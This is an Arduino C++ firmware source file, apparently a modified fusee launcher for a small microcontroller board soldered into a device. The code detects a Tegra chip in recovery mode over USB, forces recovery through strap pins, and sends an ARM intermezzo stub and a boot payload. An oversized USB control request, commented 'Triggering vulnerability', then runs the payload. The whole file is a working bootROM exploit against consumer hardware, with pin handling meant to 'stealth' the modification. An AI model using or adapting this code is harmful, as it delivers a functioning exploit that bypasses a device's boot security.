// Sam_fusee_launcher - Credits to quantum_cross for original code
// Slightly altered by mattytrog for further experiments
#include <Arduino.h>
#include <Usb.h>
#include <Adafruit_DotStar.h>
#define WAKEUP_PIN_FALLING 2       // Method 2 pin to ground (power switch solder to switched side of 150R resistor)
#define WAKEUP_PIN_RISING 4        // Method 3 pin to M92T36 pin 5 capacitor / rail
#define JOYCON_STRAP_PIN 3            // Solder to pin 10 on joycon rail
#define RCM_STRAP_TIME_us 1000000  // Amount of time to hold RCM_STRAP low and then launch payload
#define VOLUP_STRAP_PIN 0         // Use with Method 3 only. With method 2, the trinket doesn`t boot fast enough. Bootloader needs modification
#define ONBOARD_LED 13
#define LED_CONFIRM_TIME_us 2000000 // How long to show red or green light for success or fail - 2 seconds

#include "hekateload.h"

#define INTERMEZZO_SIZE 92
const byte intermezzo[INTERMEZZO_SIZE] =
{
  0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0,
  0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1,
  0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
  0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4,
  0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40,
  0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40,
};

#define PACKET_CHUNK_SIZE 0x1000

#ifdef DEBUG
#define DEBUG_PRINT(x)  Serial.print (x)
#define DEBUG_PRINTLN(x)  Serial.println (x)
#define DEBUG_PRINTHEX(x,y)  serialPrintHex (x,y)
#else
#define DEBUG_PRINT(x)
#define DEBUG_PRINTLN(x)
#define DEBUG_PRINTHEX(x,y)
#endif

USBHost usb;
EpInfo epInfo[3];

byte usbWriteBuffer[PACKET_CHUNK_SIZE] = {0};
uint32_t usbWriteBufferUsed = 0;
uint32_t packetsWritten = 0;

bool foundTegra = false;
byte tegraDeviceAddress = -1;

unsigned long lastCheckTime = 0;
unsigned long defaultpayload = 1;

const char *hexChars = "0123456789ABCDEF";
void serialPrintHex(const byte *data, byte length)
{
  for (int i = 0; i < length; i++)
  {
    DEBUG_PRINT(hexChars[(data[i] >> 4) & 0xF]);
    DEBUG_PRINT(hexChars[data[i] & 0xF]);
  }
  DEBUG_PRINTLN();
}

Adafruit_DotStar strip = Adafruit_DotStar(1, INTERNAL_DS_DATA, INTERNAL_DS_CLK, DOTSTAR_BGR);

void usbOutTransferChunk(uint32_t addr, uint32_t ep, uint32_t nbytes, uint8_t* data)
{


  EpInfo* epInfo = usb.getEpInfoEntry(addr, ep);

  usb_pipe_table[epInfo->epAddr].HostDescBank[0].CTRL_PIPE.bit.PDADDR = addr;

  if (epInfo->bmSndToggle)
    USB->HOST.HostPipe[epInfo->epAddr].PSTATUSSET.reg = USB_HOST_PSTATUSSET_DTGL;
  else
    USB->HOST.HostPipe[epInfo->epAddr].PSTATUSCLR.reg = USB_HOST_PSTATUSCLR_DTGL;

  UHD_Pipe_Write(epInfo->epAddr, PACKET_CHUNK_SIZE, data);
  uint32_t rcode = usb.dispatchPkt(tokOUT, epInfo->epAddr, 15);
  if (rcode)
  {
    if (rcode == USB_ERROR_DATATOGGLE)
    {
      epInfo->bmSndToggle = USB_HOST_DTGL(epInfo->epAddr);
      if (epInfo->bmSndToggle)
        USB->HOST.HostPipe[epInfo->epAddr].PSTATUSSET.reg = USB_HOST_PSTATUSSET_DTGL;
      else
        USB->HOST.HostPipe[epInfo->epAddr].PSTATUSCLR.reg = USB_HOST_PSTATUSCLR_DTGL;
    }
    else
    {
      strip.setPixelColor(0, 64, 0, 0); strip.show();
      DEBUG_PRINTLN("Error in OUT transfer");
      return;
    }
  }

  epInfo->bmSndToggle = USB_HOST_DTGL(epInfo->epAddr);
}

void usbFlushBuffer()
{
  usbOutTransferChunk(tegraDeviceAddress, 0x01, PACKET_CHUNK_SIZE, usbWriteBuffer);

  memset(usbWriteBuffer, 0, PACKET_CHUNK_SIZE);
  usbWriteBufferUsed = 0;
  packetsWritten++;
}

// This accepts arbitrary sized USB writes and will automatically chunk them into writes of size 0x1000 and increment
// packetsWritten every time a chunk is written out.
void usbBufferedWrite(const byte *data, uint32_t length)
{
  while (usbWriteBufferUsed + length >= PACKET_CHUNK_SIZE)
  {
    uint32_t bytesToWrite = min(PACKET_CHUNK_SIZE - usbWriteBufferUsed, length);
    memcpy(usbWriteBuffer + usbWriteBufferUsed, data, bytesToWrite);
    usbWriteBufferUsed += bytesToWrite;
    usbFlushBuffer();
    data += bytesToWrite;
    length -= bytesToWrite;
  }

  if (length > 0)
  {
    memcpy(usbWriteBuffer + usbWriteBufferUsed, data, length);
    usbWriteBufferUsed += length;
  }
}

void usbBufferedWriteU32(uint32_t data)
{
  usbBufferedWrite((byte *)&data, 4);
}

void readTegraDeviceID(byte *deviceID)
{
  byte readLength = 16;
  UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_IN, 0x40, 0, USB_HOST_NB_BK_1);

  if (usb.inTransfer(tegraDeviceAddress, 0x01, &readLength, deviceID))
    DEBUG_PRINTLN("Failed to get device ID!");
}

void sendPayload(const byte *payload, uint32_t payloadLength)
{
  byte zeros[0x1000] = {0};

  usbBufferedWriteU32(0x30298);
  usbBufferedWrite(zeros, 680 - 4);

  for (uint32_t i = 0; i < 0x3C00; i++)
    usbBufferedWriteU32(0x4001F000);

  usbBufferedWrite(intermezzo, INTERMEZZO_SIZE);
  usbBufferedWrite(zeros, 0xFA4);
  usbBufferedWrite(payload, payloadLength);
  usbFlushBuffer();
}

void findTegraDevice(UsbDeviceDefinition *pdev)
{
  uint32_t address = pdev->address.devAddress;
  USB_DEVICE_DESCRIPTOR deviceDescriptor;
  if (usb.getDevDescr(address, 0, 0x12, (uint8_t *)&deviceDescriptor))
  {
    DEBUG_PRINTLN("Error getting device descriptor.");
    return;
  }

  if (deviceDescriptor.idVendor == 0x0955 && deviceDescriptor.idProduct == 0x7321)
  {
    tegraDeviceAddress = address;
    foundTegra = true;
  }
}

void setupTegraDevice()
{
  epInfo[0].epAddr = 0;
  epInfo[0].maxPktSize = 0x40;
  epInfo[0].epAttribs = USB_TRANSFER_TYPE_CONTROL;
  epInfo[0].bmNakPower = USB_NAK_MAX_POWER;
  epInfo[0].bmSndToggle = 0;
  epInfo[0].bmRcvToggle = 0;

  epInfo[1].epAddr = 0x01;
  epInfo[1].maxPktSize = 0x40;
  epInfo[1].epAttribs = USB_TRANSFER_TYPE_BULK;
  epInfo[1].bmNakPower = USB_NAK_MAX_POWER;
  epInfo[1].bmSndToggle = 0;
  epInfo[1].bmRcvToggle = 0;

  usb.setEpInfoEntry(tegraDeviceAddress, 2, epInfo);
  usb.setConf(tegraDeviceAddress, 0, 0);
  usb.Task();

  UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_IN, 0x40, 0, USB_HOST_NB_BK_1);
}

void sleep(int errorCode) {
  // Turn off all LEDs and go to sleep. To launch another payload, press the reset button on the device.
  //delay(100);
  digitalWrite(PIN_LED_RXL, HIGH);
  digitalWrite(PIN_LED_TXL, HIGH);
  digitalWrite(ONBOARD_LED, LOW);
  if (errorCode == 1) {
    setLedColor("green"); //led to red
    delayMicroseconds(LED_CONFIRM_TIME_us);
    setLedColor("black"); //led to off
  } else {
    setLedColor("red"); //led to red
    delayMicroseconds(LED_CONFIRM_TIME_us);
    setLedColor("black"); //led to off
  }

  foundTegra = false;
  SCB->SCR |= SCB_SCR_SLEEPDEEP_Msk; /* Enable deepsleep */

  GCLK->CLKCTRL.reg = uint16_t(
      GCLK_CLKCTRL_CLKEN |
      GCLK_CLKCTRL_GEN_GCLK2 |
      GCLK_CLKCTRL_ID( GCLK_CLKCTRL_ID_EIC_Val )
  );
  while (GCLK->STATUS.bit.SYNCBUSY) {}
  
  __DSB(); /* Ensure effect of last store takes effect */
  __WFI(); /* Enter sleep mode */
}

void setLedColor(const char color[]) {
  if (color == "red") {
    strip.setPixelColor(0, 64, 0, 0);
  } else if (color == "green") {
    strip.setPixelColor(0, 0, 64, 0);
  } else if (color == "white") {
    strip.setPixelColor(0, 64, 64, 64);
  } else if (color == "orange") {
    strip.setPixelColor(0, 64, 32, 0);
  } else if (color == "blue") {
    strip.setPixelColor(0, 0, 0, 64);
  } else if (color == "black") {
    strip.setPixelColor(0, 0, 0, 0);
  } else {
    strip.setPixelColor(0, 255, 255, 255);
  }
  strip.show();
}

void wakeup_rising(){
  // Both straps Low
  pinMode(JOYCON_STRAP_PIN, OUTPUT);
  pinMode(VOLUP_STRAP_PIN, OUTPUT);
  digitalWrite(JOYCON_STRAP_PIN, LOW);
  digitalWrite(VOLUP_STRAP_PIN, LOW);
  setLedColor("blue");
  // 1 second
  delayMicroseconds(RCM_STRAP_TIME_us);
  SCB->AIRCR = ((0x5FA << SCB_AIRCR_VECTKEY_Pos) | SCB_AIRCR_SYSRESETREQ_Msk); //full software reset
}

void wakeup_falling(){
  // Both Straps Low
  pinMode(JOYCON_STRAP_PIN, OUTPUT);
  pinMode(VOLUP_STRAP_PIN, OUTPUT);
  digitalWrite(JOYCON_STRAP_PIN, LOW);
  digitalWrite(VOLUP_STRAP_PIN, LOW);
  setLedColor("green");
  // 1 second
  delayMicroseconds(RCM_STRAP_TIME_us);
  SCB->AIRCR = ((0x5FA << SCB_AIRCR_VECTKEY_Pos) | SCB_AIRCR_SYSRESETREQ_Msk); //full software reset
}

void setup()
{
  // This continues after the reset after a wakeup_rising or wakeup_falling
  // Set straps as input to "stealth" any funny business on the RCM_STRAP
  pinMode(JOYCON_STRAP_PIN, INPUT);
  pinMode(VOLUP_STRAP_PIN, INPUT);
  pinMode(WAKEUP_PIN_RISING, INPUT);
  pinMode(WAKEUP_PIN_FALLING, INPUT_PULLUP);

  // Before sleeping, make sure that we can wake up again when the switch turns on
  // by attaching interrupts to the wakeup pins
  attachInterrupt(WAKEUP_PIN_RISING, wakeup_rising, RISING);
  attachInterrupt(WAKEUP_PIN_FALLING, wakeup_falling, FALLING);
  EIC->WAKEUP.vec.WAKEUPEN |= (1<<6);

  strip.begin();

  int usbInitialized = usb.Init();
#ifdef DEBUG
  Serial.begin(115200);
  delay(100);
#endif

  if (usbInitialized == -1) sleep(-1);

  DEBUG_PRINTLN("Ready! Waiting for Tegra...");
  bool blink = true;
  int currentTime = 0;
  while (!foundTegra)
  {
    currentTime = millis();
    usb.Task();

    if (currentTime > lastCheckTime + 100) {
      usb.ForEachUsbDevice(&findTegraDevice);
      if (blink && !foundTegra) {
        setLedColor("white"); //led to white
      } else {
        setLedColor("black"); //led to black
      }
      blink = !blink;
      lastCheckTime = currentTime;
    }
    if (currentTime > 1500) {
      sleep(-1);
    }

  }

  DEBUG_PRINTLN("Found Tegra!");
  setupTegraDevice();

  byte deviceID[16] = {0};
  readTegraDeviceID(deviceID);
  DEBUG_PRINTLN("Device ID: ");
  DEBUG_PRINTHEX(deviceID, 16);

  DEBUG_PRINTLN("Sending payload...");
  UHD_Pipe_Alloc(tegraDeviceAddress, 0x01, USB_HOST_PTYPE_BULK, USB_EP_DIR_OUT, 0x40, 0, USB_HOST_NB_BK_1);
  packetsWritten = 0;
  sendPayload(fuseeBin, FUSEE_BIN_SIZE);

  if (packetsWritten % 2 != 1)
  {
    DEBUG_PRINTLN("Switching to higher buffer...");
    usbFlushBuffer();
  }

  DEBUG_PRINTLN("Triggering vulnerability...");
  usb.ctrlReq(tegraDeviceAddress, 0, USB_SETUP_DEVICE_TO_HOST | USB_SETUP_TYPE_STANDARD | USB_SETUP_RECIPIENT_INTERFACE,
              0x00, 0x00, 0x00, 0x00, 0x7000, 0x7000, usbWriteBuffer, NULL);
  DEBUG_PRINTLN("Done!");

  sleep(1);


}

void loop()
{
  sleep(1);
}
